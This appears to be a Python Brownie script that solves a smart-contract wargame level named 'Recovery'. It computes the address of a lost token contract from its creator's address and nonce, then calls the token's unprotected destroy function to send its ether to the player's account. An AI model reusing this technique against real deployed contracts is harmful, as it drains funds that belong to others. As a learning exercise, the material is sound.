from brownie import Recovery, config, accounts, SimpleToken
from web3 import Web3


InstanceAddress = "0x5CCa2F7dF1003cB76eb488dE8FB68cf567B23BCF"
player = accounts.add(config["wallets"]["from_key"]) 
recovery = Recovery.at(InstanceAddress)
zero = "0x"
def get_addr(creator, nonce=1):
    hash = Web3.solidityKeccak(
        ["bytes", "bytes", "address", "bytes"],
        ["0xd6", "0x94", InstanceAddress, "0x01"]
    )
    hash_hex = Web3.toHex(hash)
    token_address = zero + hash_hex[-40:]
    print(f"Token address is :{token_address}")
    token = SimpleToken.at(token_address)
    print(f"token balance is {token.balance()}")
    token.destroy(player, {"from": player})
    print(f"token balance is {token.balance()}")
def main():
    get_addr(recovery)

